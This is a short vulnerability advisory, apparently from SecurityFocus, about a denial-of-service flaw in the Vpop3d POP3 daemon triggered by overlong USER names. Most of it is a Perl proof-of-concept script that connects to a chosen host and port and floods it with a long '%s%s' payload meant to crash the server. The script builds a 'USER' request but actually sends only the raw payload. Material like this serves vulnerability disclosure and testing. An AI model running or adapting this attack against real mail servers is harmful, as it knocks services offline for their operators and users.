source: http://www.securityfocus.com/bid/8473/info

A vulnerability has been reported for Vpop3d that may make it prone to denial of service attacks. The problem is said to occur due to the affected daemon failing to sufficiently handle USER name values of excessive length. As a result, if a malicious packet is received, after a specific amount of time the affected server may abnormally terminate.

#!/usr/bin/perl

#vpop3d Denial Of Service..
#Proof of Concept script..
#Deadbeat, uk2sec..
#e: deadbeat@sdf.lonestar.org
#e: daniels@legend.co.uk

use IO::Socket;
$host = $ARGV[0];
$port = $ARGV[1];
if(!$ARGV[1]){
        die "usage: perl $0 <host> <port>\n";
}
$dos = "%s%s"x5000;
$req = "USER $dos";
$sox = IO::Socket::INET->new(
        Proto=>"tcp",
        PeerPort=>$port,
        PeerAddr=>$host
)or die "can't connect to $host : $port\n";
sleep 2;
print $sox $dos;
sleep 1;
print "done..vpop3d should lock now :)\n";

